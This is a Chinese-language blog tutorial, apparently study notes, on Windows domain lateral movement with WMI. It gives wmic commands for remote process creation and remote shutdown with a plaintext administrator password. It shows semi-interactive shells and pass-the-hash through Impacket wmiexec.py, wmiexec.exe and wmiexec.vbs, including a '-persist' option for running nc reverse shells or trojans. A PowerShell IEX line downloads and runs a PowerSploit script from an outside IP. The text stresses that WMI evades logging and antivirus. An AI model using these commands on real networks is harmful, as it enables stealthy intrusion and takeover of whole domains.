![](https://image.3001.net/images/20200812/1597200959.jpg!small)

## 横向移动

在内网渗透中，当攻击者获取到内网某台机器的控制权后，会以被攻陷的主机为跳板，通过收集域内凭证等各种方法，访问域内其他机器，进一步扩大资产范围。通过此类手段，攻击者最终可能获得域控制器的访问权限，甚至完全控制基于Windows操作系统的整个内网环境，控制域环境下的全部机器。

这篇文章，我们来讲解WMI在横向渗透中的使用。

## WMI 的使用

WMI的全名为“Windows Management Instrumentation”。从Windows
98开始，Windows操作系统都支持WMI。WMI是由一系列工具集组成的，可以在本地或者远程管理计算机系统。

自从PsExec在内网中被严格监控后，越来越多的反病毒厂商将PsExec加入了黑名单，于是攻击者逐渐开始使用WMI进行横向移动。通过渗透测试发现，在使用wmiexec进行横向移动时，Windows操作系统默认不会将WMI的操作记录在日志中，同时攻击脚本无需写入到磁盘，具有极高的隐蔽性。因为在这个过程中不会产生日志，所以，对网络管理员来说增加了攻击溯源的成本。而对攻击者来说，其恶意行为被发现的可能性有所降低、隐蔽性有所提高。由此，越来越多的APT开始使用WMI进行攻击，利用WMI可以进行信息收集、探测、反病毒、虚拟机检测、命令执行、权限持久化等操作。

## WMI 常用命令

### 文件管理

    
    
    wmic fsdir where "drive='c:' and filename='whoami'" list

![](https://image.3001.net/images/20200812/1597201685.png!small)
**删除C盘下的test目录**

    
    
    wmic fsdir "c:\\test" call delete

注意“\”要进行一下转义

![](https://image.3001.net/images/20200812/1597202246.png!small)

执行如下命令可以枚举出整个系统中的所有可执行文件：

    
    
    wmic process where “NOT ExecutablePath LIKE ‘%Windows%’” GET ExecutablePath
    

![](https://image.3001.net/images/20200812/1597203037.png!small)

**wmic 全盘搜索某文件并获取该文件所在目录**

    
    
    for /f "skip=1 tokens=1*" %i in ('wmic datafile where "FileName='qq' and extension='exe'" get drive^,path') do (set "qPath=%i%j"&@echo %qPath:~0,-3%)

### 系统环境设置管理

WMIC可以提取出所有重要系统文件的路径，例如temp目录和win目录等等：

    
    
    wmic environment get Description, VariableValue

![](https://image.3001.net/images/20200812/1597203342.png!small)
**获取temp环境变量**

    
    
    wmic environment where "name='temp'" get UserName,VariableValue

![](https://image.3001.net/images/20200812/1597203538.png!small)
**更改PATH环境变量值，新增c:\whoami**

    
    
    wmic environment where "name='path' and username='<system>'" set VariableValue="%path%;c:\whoami"

### ![](https://image.3001.net/images/20200812/1597203782.png!small)进程管理

列出所有进程信息

    
    
    wmic process list brief

Full显示所有、Brief显示摘要、Instance显示实例、Status显示状态

    
    
    wmic process get processid,name,executablepath 

![](https://image.3001.net/images/20200812/1597204049.png!small)

**获取指定进程可执行文件的路径**

    
    
    wmic process where name="vmtoolsd.exe" get executablepath

![](https://image.3001.net/images/20200812/1597204196.png!small)

    
    
    wmic process call create "C:\windows\system32\notepad.exe"

![](https://image.3001.net/images/20200812/1597204386.png!small)
**根据系统命令创建进程**

    
    
    wmic process call create "cmd.exe /c 'ipconfig'"
    wmic process call create "shutdown.exe -r -f -t 60"
    
    
    wmic process where name="notepad.exe" delete  
    wmic process where pid="244" delete 

### 用户账户管理

    
    
    wmic useraccount
    wmic useraccount list brief

![](https://image.3001.net/images/20200812/1597204874.png!small)

    
    
    wmic useraccount where "name='%UserName%'" call rename newUserName   // 更改当前用户名  
    wmic useraccount where "name='Administrator'" call Rename admin  // 更改指定用户名

### 计算机系统管理

    
    
    wmic computersystem get domain

![](https://image.3001.net/images/20200812/1597207725.png!small)

### 自启程序管理

    
    
    wmic startup get command,caption

### ![](https://image.3001.net/images/20200812/1597207787.png!small)

### 服务管理

    
    
    wmic service list brief

![](https://image.3001.net/images/20200812/1597207966.png!small)

    
    
    wmic service where "state='running'" list brief
    
    
    wmic service where "name='tlntsvr'" call startservice

![](https://image.3001.net/images/20200812/1597208338.png!small)

    
    
    wmic service where "name='tlntsvr'" call stopservice

### 获取补丁信息

    
    
    wmic qfe list brief
    wmic qfe get Caption,Description,HotFixID,IntsalledOn

### ![](https://image.3001.net/images/20200812/1597208596.png!small)

### 查看域控制器

    
    
    wmic ntdomain list brief

![](https://image.3001.net/images/20200812/1597215708.png!small)

### 查看安装的软件信息

    
    
    wmic product get name,version

### ![](https://image.3001.net/images/20200812/1597215997.png!small)

### 远程桌面连接

使用WMIC命令开启远程计算机的远程桌面连接：

    
    
    wmic /node:192.168.52.138 /USER:administrator PATH win32_terminalservicesetting WHERE (__Class!="") CALL SetAllowTSConnections 1
    // wmic /node:"[full machine name]" /USER:"[domain]\[username]" PATH win32_terminalservicesetting WHERE (__Class!="") CALL SetAllowTSConnections 1
    

### 共享管理

    
    
    wmic share list brief
    wmic share get name,path,status

![](https://image.3001.net/images/20200812/1597208823.png!small) **创建和删除共享**

    
    
    // 建立共享
    wmic share call create "","test","3","TestShareName","","c:\whoami",0
    (可使用 WMIC SHARE CALL Create /? 查看create后的参数类型)
    // 删除共享
    wmic share where "name='C$'" call delete
    wmic share where "path='c:\test'" delete

## 使用WMI进行横向移动

注：使用WMIC连接远程主机，需要目标主机开放135和445端口。(135 端⼝是 WMIC 默认的管理端⼝，wimcexec 使⽤445端⼝传回显)

### 远程创建进程

如下，以administrator用户连接192.168.52.138(DC)，并在机器上创建一个进程执行ipconfig命令，将结果写入c:\result.txt文本文件中：（由于wmic执行远程命令没有回显，所以要将结果写入到txt中）

    
    
    wmic /node:192.168.52.138 /user:administrator /password:Liufupeng123 process call create "cmd.exe /c ipconfig > c:\result.txt"  
      
    // /node：指定将对其进行操作的服务器

![](https://image.3001.net/images/20200812/1597209578.png!small)这里由于我预先与目标主机建立了ipc$连接，所以就不需要在wmic指定/user和/password了。

建立ipc$连接后，使用type命令远程读取192.168.52.138上的执行结果：

    
    
    type \\192.168.52.138\c$\result.txt

![](https://image.3001.net/images/20200812/1597209774.png!small) **重启远程计算机**

    
    
    wmic /node:192.168.52.138 /user:administrator /password:Liufupeng123 /process call create "shutdown.exe -r -f -m"

使用WMIC远程执行命令，在远程系统中启动WMIC服务(目标服务器需要开放其默认135端口，WMIC会以管理员权限在远程系统中执行命令)。如果目标服务器开启了防火墙，WMIC将无法连接。另外由于wmic命令没有回显，需要使用IPC$和type命令来读取信息。需要注意的是，如果WMIC执行的是恶意程序，将不会留下日志。我们可以使用如下这些工具来执行wmi远程命令。

## WMIEXEC

wmiexec是对windows自带的wmic做了一些强化，让渗透变得更容易。只能说很多工具吧，比较好用的在这里介绍几种。wmiexec需要提供账号密码进行远程连接，但是如果没有破解出账号和明文密码，也可以配合哈希传递或票据注入功能一起使用，先进行传递或注入，然后再使用WMIEXEC即可。

### Impacket中的wmiexec.py

该脚本主要在从Linux像Windows进行横向渗透时使用，十分强大，可以走socks代理进入内网。

下载地址：<https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py>

需要先下载impacket工具包，这里面有很多工具

    
    
    git clone https://github.com/CoreSecurity/impacket.git
     cd impacket/
     pip install .

安装成功后，切换到examples目录下，运行如下命令获取目标系统192.168.52.138的shell：

    
    
    python wmiexec.py administrator:Liufupeng123@192.168.52.138
    // python wmiexec.py 用户名:密码@目标IP

![](https://image.3001.net/images/20200812/1597210612.png!small)如果对wmiexec.py指定-hashes的话，则可进行哈希传递

    
    
    python wmiexec.py -hashes LM Hash:NT Hash 域名/用户名@目标IP    // 哈希传递获得shell  
    python wmiexec.py -hashes LM Hash:NT Hash 域名/用户名@目标IP "ipconfig"   // 执行命令

### ![](https://image.3001.net/images/20200812/1597210792.png!small)
**EXE版本的** wmiexec

命令与wmiexec.py是一模一样的。运行如下命令获取目标系统192.168.52.138的shell：

    
    
    wmiexec.exe administrator:Liufupeng123@192.168.52.138

![](https://image.3001.net/images/20200812/1597211203.png!small)wmiexec.exe主要用在Windows上。

### wmiexec.vbs

下载地址：[Here](https://www.secpulse.com/wp-content/uploads/2015/05/cache-a360611dc24d240989799c29c555e4b7_wmiexec-v1_1.rar)

wmiexec.vbs脚本通过VBS调用WMI来模拟PsExec的功能。其可以在远程系统中执行命令并进行回显，获取远程主机的半交互式Shell。

wmiexec.vbs支持两种模式，一种是半交互式shell模式，另一种是执行单条命令模式。

执行如下命令，获得目标主机(192.168.52.138)的一个半交互式的Shell：

    
    
    cscript.exe //nologo wmiexec.vbs /shell 192.168.52.138 administrator Liufupeng123  
    // cscript用于在Windows中执行脚本

![](https://image.3001.net/images/20200812/1597212249.png!small)输入如下命令，使用wmiexec.vbs在远程主机上直接执行单条命令：（有回显）

    
    
    cscript.exe //nologo wmiexec.vbs /cmd 192.168.52.138 administrator Liufupeng123 "ipconfig"

![](https://image.3001.net/images/20200812/1597212381.png!small)

 **注意：** **对于运行时间较长的命令，例如ping、systeminfo等，需要添加“-wait 5000”或更长时间的参数。**

由于正常的命令都要查看结果，所以执行的命令后面都会加上重定向符，把结果输出到文件中。所以wmiexec.vbs在运行nc反弹shell或者msf木马木马等不需要输出结果但需要一直运行的程序时，因为木马进程会一直存在，导致结果文件被占用，不能删除，也不能改写。出现这种情况后由于结果文件被占用，所以WMIEXEC不能工作，除非手动更改脚本中的结果文件名。或者可以用taskkill
远程结束掉卡死的进程，然后WMIEXEC可以恢复工作。为了解决这个问题，加入了“-persist” 选项。

 **当命令加了“-persist”
选项后，程序会在后台运行，不会有结果输出，而且会返回这个命令进程的PID，方便结束进程。这样就可以运行nc或者木马程序了。**

![](https://image.3001.net/images/20200812/1597213172.png!small)

wmiexec.vbs已经被各大厂商杀的死死的了。

## 使用PowerShell来执行WMI命令

### Invoke-WmiCommand.ps1

下载地址：<https://github.com/PowerShellMafia/PowerSploit>

Invoke-WmiCommand.ps1是PowerSploit中的一个脚本工具，该脚本主要通过powershell调用WMI来远程执行命令，本质上还是利用WMI。

适用于Windows Server 2008 和 Windows
7及以上默认内置powershell的版本。使用如下，在powershell中分别输入如下命令：

    
    
    IEX(New-Object Net.Webclient).DownloadString('http://39.xxx.xxx.210/powersploit/CodeExecution/Invoke-WmiCommand.ps1')     // 下载脚本并导入系统  
    $User = "域名\用户名"     // 指定目标系统用户名  
    $Password = ConvertTo-SecureString -String "文明密码" -AsPlainText -Force   // 指定目标系统的密码  
    $Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password    // 将账号和密码整合起来，以便导入credential  
    $Remote = Invoke-WmiCommand -Payload {要执行的命令} -Credential $Cred -ComputerName 目标IP  
    $Remote.PayloadOutput       // 将执行结果输出到屏幕上

### Invoke-WMIMethod.ps1

Invoke-WMIMethod.ps1模块是powershell自带的，可以在远程系统中执行命令和指定程序。在powershell命令行环境执行如下命令，可以以非交互式的方式执行远程命令，但不会回显执行结果。

    
    
    $User="域名\用户名"    // 指定目标系统用户名  
    $Password=ConvertTo-SecureString -String "密码" -AsPlainText -Force   // 指定目标系统密码  
    $Cred=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password     // 将账号和密码整合起来，以便导入 Credential中  
    Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" -ComputerName "目标机IP" -Credential $Cred   // 在远程系统中运行notepad.exe命令

![](https://image.3001.net/images/20200812/1597217668.png!small)

## Ending......

> 参考：
>
>
> [https://blog.csdn.net/jhsword/article/details/96623333](https://blog.csdn.net/jhsword/article/details/96623333?utm_medium=distribute.pc_relevant.none-> task-blog-> BlogCommendFromMachineLearnPai2-1.add_param_isCf&depth_1-utm_source=distribute.pc_relevant.none-> task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf)
>
>
> [https://www.freebuf.com/articles/system/182531.html](articles/system/182531.html)
>
>
> [https://blog.csdn.net/qq_36119192/article/details/102984779](https://blog.csdn.net/qq_36119192/article/details/102984779#%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86)
>
> <https://blog.csdn.net/qq_27446553/article/details/46008473>
>
> 《内网安全攻防：渗透测试实战指南》

![](https://image.3001.net/images/20200812/1597218288.jpg!small)

文章大多是我学习的总结，因初来乍到，必有很多不足之处，还请各位前辈多多指教，小生还需多多向各位前辈学习。

个人博客：<https://whoamianony.top/>

